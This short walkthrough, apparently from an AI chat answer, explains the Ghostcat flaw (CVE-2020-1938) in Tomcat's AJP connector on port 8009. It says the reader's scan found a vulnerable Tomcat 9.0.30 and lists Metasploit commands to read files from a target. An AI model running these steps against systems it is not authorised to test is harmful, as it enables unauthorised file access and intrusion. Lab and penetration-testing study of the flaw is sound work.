## 1) Quick background (why this works)

- The AJP connector (default port **8009**) in Tomcat can be abused (Ghostcat, **CVE-2020-1938**) to read files from webapps or even cause file inclusion in some setups. Tomcat **9.0.30** is in the vulnerable range. [Medium+2sonatype.com+2](https://medium.com/%40sushantkamble/apache-ghostcat-cve-2020-1938-explanation-and-walkthrough-23a9a1ae4a23?utm_source=chatgpt.com)
    

---

## 2) Confirm vulnerability (enumeration)

You already have `Apache Tomcat/9.0.30` from your scan — that matches known vulnerable versions. 

## 3) Read files via AJP (file read) — common approach

Metasploit includes modules to interact with AJP/Ghostcat:

```
msfconsole
# then:
use auxiliary/scanner/http/tomcat_ghostcat  # (module name may vary; search for "ghostcat")
set RHOSTS <TARGET_IP>
set RPORT 8009
run
```